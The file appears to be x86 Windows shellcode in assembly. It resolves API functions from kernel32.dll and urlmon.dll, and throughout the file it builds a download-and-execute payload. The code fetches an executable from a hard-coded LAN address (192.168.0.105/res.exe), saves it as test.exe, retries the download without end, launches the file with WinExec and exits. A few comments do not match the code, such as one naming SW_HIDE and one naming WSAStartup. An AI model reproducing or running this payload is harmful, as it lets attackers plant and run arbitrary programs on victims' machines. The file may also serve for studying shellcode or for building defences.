_start:
; Create a new stack frame
 mov ebp, esp            ; Set base stack pointer for new stack-frame
 sub esp, 0x20           ; Decrement the stack by 2 x 16 = 32 bytes

; Find kernel32.dll base address
 xor ebx, ebx            ; EBX = 0x00000000
 mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
 mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
 mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
 mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
 mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
 mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
 mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll

; Find the address of the WinExec Symbol within kernel32.dll
; + The hex values will change with different versions of Windows

; Find the address of the Export Table within kernel32.dll
 mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader  = 0xF8
 add ebx, eax            ; EBX = &NewEXEHeader        = 0xF8 + &kernel32.dll
 mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable      = 0x777B0 = [&NewExeHeader + 0x78]
 add ebx, eax            ; EBX = &ExportTable         = RVA ExportTable + &kernel32.dll

; Find the address of the Name Pointer Table within kernel32.dll
; + Contains pointers to strings of function names - 4-byte/dword entries
 mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable = 0x790E0
 add edi, eax            ; EDI = &NamePointerTable    = 0x790E0 + &kernel32.dll
 mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame

; Find the address of the Ordinal Table
;   - 2-byte/word entries
 mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable     = 0x7A9E8
 add ecx, eax            ; ECX = &OrdinalTable        = 0x7A9E8 + &kernel32.dll
 mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame

; Find the address of the Address Table
 mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable     = 0x777CC
 add edx, eax            ; EDX = &AddressTable        = 0x777CC + &kernel32.dll
 mov [ebp-0x10], edx     ; save &AddressTable to stack-frame

; Find Number of Functions within the Export Table of kernel32.dll
 mov edx, [ebx+0x14]     ; EDX = Number of Functions  = 0x642
 mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame

jmp short functions

findFunctionAddr:
; Initialize the Counter to prevent infinite loop
 xor eax, eax            ; EAX = Counter = 0
 mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
searchLoop:
 mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
 mov esi, [ebp+0x18]     ; ESI = Address of String for the Symbol we are searching for 
 xor ecx, ecx            ; ECX = 0x00000000
 cld                     ; clear direction flag - Process strings from left to right
 mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
 add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
 add cx, 0x8             ; ECX = len("WinExec,0x00") = 8 = 7 char + 1 Null
 repe cmpsb              ; compare first 8 bytes of [&NameString] to "WinExec,0x00"
 jz found                ; If string at [&NameString] == "WinExec,0x00", then end loop
 inc eax                 ; else Counter ++
 cmp eax, edx            ; Does EAX == Number of Functions?
 jb searchLoop           ;   If EAX != Number of Functions, then restart the loop

found:
; Find the address of WinExec by using the last value of the Counter
 mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
 mov edx, [ebp-0x10]     ; EDX = &AddressTable
 mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber   = [&OrdinalTable + (Counter*2)]
 mov eax, [edx + eax*4]  ; EAX = RVA WinExec     = [&AddressTable + ordinalNumber]
 add eax, [ebp-0x4]      ; EAX = &WinExec        = RVA WinExec + &kernel32.dll
 ret

functions:
; Push string "GetProcAddress",0x00 onto the stack
xor eax, eax            ; clear eax register
mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"
push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
push 0x41636f72         ; Acor : 41636f72
push 0x50746547         ; PteG : 50746547
mov [ebp+0x18], esp      ; save PTR to string at bottom of stack (ebp)
call findFunctionAddr   ; After Return EAX will = &GetProcAddress
; EAX = &GetProcAddress
mov [ebp-0x1C], eax      ; save &GetProcAddress

; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
xor edx, edx            ; EDX = 0x00000000
push edx                ; null terminator for LoadLibraryA string
push 0x41797261         ; Ayra : 41797261 // "LoadLibraryA",0x00
push 0x7262694c         ; rbiL : 7262694c
push 0x64616f4c         ; daoL : 64616f4c
push esp                ; $hModule    -- push the address of the start of the string onto the stack
push dword [ebp-0x4]    ; $lpProcName -- push base address of kernel32.dll to the stack
mov eax, [ebp-0x1C]     ; Move the address of GetProcAddress into the EAX register
call eax                ; Call the GetProcAddress Function.
mov [ebp-0x20], eax     ; save Address of LoadLibraryA

; Call LoadLibraryA(PTR "urlmon")
;   push "urlmon",0x00 to the stack and save pointer
xor eax, eax            ; clear eax
mov ax, 0x6E6F          ; no : 6E6F
push eax
push 0x6D6C7275         ; mlru : 6D6C7275
push esp                ; push the pointer to the string
mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
call ebx                ; call the LoadLibraryA Function to load urlmon.dll
mov [ebp-0x24], eax     ; save Address of urlmon.dll

; Call GetProcAddress(urlmon.dll, "URLDownloadToFileA")
xor edx, edx
mov dx, 0x4165          ; Ae
push edx
push 0x6C69466F         ; liFo
push 0x5464616F         ; Tdao
push 0x6C6E776F         ; lnwo
push 0x444c5255         ; DLRU
push esp    		; push pointer to string to stack for 'URLDownloadToFileA'
push dword [ebp-0x24]   ; push base address of urlmon.dll to stack
mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
call eax                ; GetProcAddress
;   EAX = WSAStartup Address
mov [ebp-0x28], eax     ; save Address of urlmon.URLDownloadToFileA

;URLDownloadToFileA(NULL, URL, save as, 0, NULL)
download:
pop eax
xor ecx, ecx
push ecx
; URL: http://192.168.0.105/res.exe
push 0x6578652E         ; exe.
push 0x7365722F         ; ser/
push 0x3530312E         ; 501.
push 0x302E3836         ; 0.86
push 0x312E3239         ; 1.29
push 0x312F2F3A         ; 1//:
push 0x70747468         ; ptth
push esp
pop ecx                 ; save the URL string
xor ebx, ebx
push ebx
; save as test.exe
push 0x6578652E         ; exe.
push 0x74736574         ; tset
push esp
pop ebx                 ; save the downloaded filename string
xor edx, edx
push edx
push edx
push ebx
push ecx
push edx
mov eax, [ebp-0x28]     ; PTR to URLDownloadToFileA to EAX
call eax
pop ecx
add esp, 44
xor edx, edx
cmp eax, edx
push ecx
jnz download            ; if it fails to download , retry contineusly
pop edx

; Create string 'WinExec\x00' on the stack and save its address to the stack-frame
mov edx, 0x63657878     ; "cexx"
shr edx, 8              ; Shifts edx register to the right 8 bits
push edx                ; "\x00,cex"
push 0x456E6957         ; EniW : 456E6957
mov [ebp+0x18], esp     ; save address of string 'WinExec\x00' to the stack-frame
call findFunctionAddr   ; After Return EAX will = &WinExec

; Call WinExec( CmdLine, ShowState );
;   CmdLine   = "tset.exe"
;   ShowState = 0x00000000 = SW_HIDE - Hides the window and activates another window.
xor ecx, ecx          ; clear eax register
push ecx              ; string terminator 0x00 for "test.exe" string
push 0x6578652e       ; exe. : 6578652e
push 0x74736574       ; tset : 74736574
mov ebx, esp          ; save pointer to "test.exe" string in eax
inc ecx               ; uCmdShow SW_SHOWNORMAL = 0x00000001
push ecx              ; uCmdShow  - push 0x1 to stack # 2nd argument
push ebx              ; lpcmdLine - push string address stack # 1st argument
call eax              ; Call the WinExec Function

; Create string 'ExitProcess\x00' on the stack and save its address to the stack-frame
 xor ecx, ecx          ; clear eax register
 mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
 shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
 push ecx                ;  sse : 00737365
 push 0x636F7250         ; corP : 636F7250
 push 0x74697845         ; tixE : 74697845
 mov [ebp+0x18], esp     ; save address of string 'ExitProcess\x00' to stack-frame
 call findFunctionAddr   ; After Return EAX will = &ExitProcess

; Call ExitProcess(ExitCode)
 xor edx, edx
 push edx                ; ExitCode = 0
 call eax                ; ExitProcess(ExitCode)